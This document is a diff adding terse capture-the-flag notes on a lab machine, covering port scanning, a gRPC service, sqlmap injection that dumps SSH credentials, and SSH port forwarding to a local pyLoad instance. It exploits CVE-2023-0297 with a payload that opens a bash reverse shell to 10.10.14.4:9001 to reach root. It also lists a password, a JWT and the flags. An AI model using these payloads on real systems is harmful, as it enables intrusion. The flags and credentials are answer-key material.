@@ -1,0 +1,56 @@
+ping connect .
+nmap scanning all port -> open : 22,50051
+
+22 -ssh
+50051 -> ? ( google search : grpcui)
+download the source grpccui from github.
+-> /go/bin -> ./grpcui -plaintext pc:50051.
+
+create a account 
+-> admin token.
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODY1MDQ2MDV9.0JsEbY4bAX4MYdztnHQNHnCDxRPSD53n92Jx0Qr8Zpg
+-> try on jwt.io
+
+Burp_suite-> try .
+
+-> use sqlmap.
+sqlmap -r id.req --batch.
+sqlmap -r id.req --batch --dbs
+sqlmap -r id.req --batch --dump
+----> got username and password (can connect to port 22) 
+sau : HereIsYourPassWord1431 
+-> got from user.txt : c9dfa6f68336eb373738daa94f1d338d
+
+show socket ,tcp listening : ss -tnl : (127.0.0.1:8000 )
+curl http://127.0.0.1
+
+connect again with -L : ssh -L 9000:127.0.0.1:8000 (this make the port 8000 can avalible on my machines at port 9000.)
+--> can access this web on my firefox.
+-> pyload -> search exploit. (https://github.com/advisories/GHSA-pf38-5p22-x6h6) (CVE-2023-0297)
+
+ps -ef | grep -i pyload 
+--> this file can run as root.
+
+BurpSuite -> try payload got from github.
+
+
+payload1:
+package=xxx&crypted=AAAA&jk=pyimport+os;os.system("ping+-c2+10.10.14.4");f=function%20f2(){}; -> test .
+payload2 :
+package=xxx&crypted=AAAA&jk=pyimport+os;os.system("/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.4/9001+0>%261'");f=function%20f2(){}; 
+
+
+test packet recived:
+
+tcpdump -i tun0 icmp
+
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+12:12:58.392791 IP pc > 10.10.14.4: ICMP echo request, id 4, seq 1, length 64
+12:12:58.392820 IP 10.10.14.4 > pc: ICMP echo reply, id 4, seq 1, length 64
+12:12:59.394243 IP pc > 10.10.14.4: ICMP echo request, id 4, seq 2, length 64
+12:12:59.394266 IP 10.10.14.4 > pc: ICMP echo reply, id 4, seq 2, length 64
+
+nc -lvnp 9001 (listen)
+-> catch the shell -> got the root flag : bca6a90d4092088b6b24e4671a03d2d8     
